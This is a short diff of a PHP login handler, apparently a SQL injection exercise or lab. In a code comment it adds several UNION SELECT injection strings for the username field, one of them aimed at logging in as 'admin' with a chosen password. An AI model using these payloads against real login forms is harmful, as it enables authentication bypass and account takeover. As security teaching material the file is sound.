@@ -8,8 +8,15 @@ function error($x){
 }
 if (isset($_POST["username"])){
 	/*
-	username: 	' UNION SELECT 'pass' from users -- '
+	username: 	' UNION SELECT null, null, 'pass' from users -- '
 	password:	pass
+	
+	username: 	' UNION SELECT id, username, "pass" from users -- '
+	password:   pass
+	
+	username: 	' UNION SELECT id, username, "pass" from users where username="admin" -- '
+	password:   pass
+	
 	*/
 	
 	include "credentials/iss.php";
